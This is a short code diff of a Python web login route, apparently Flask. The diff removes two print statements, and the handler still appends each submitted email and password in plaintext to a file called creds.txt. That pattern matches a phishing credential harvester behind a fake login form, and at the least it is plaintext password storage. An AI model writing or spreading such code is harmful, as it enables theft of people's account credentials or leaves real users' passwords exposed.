@@ -10,8 +10,6 @@ def login():
     if request.method == 'POST':
         email = request.form.get('email')
         password = request.form.get('password')
-        print(f"Received email: {email}")
-        print(f"Received Password: {password}")
         with open("creds.txt", "a") as f:
             f.write(f"{email}:{password}\n")
 
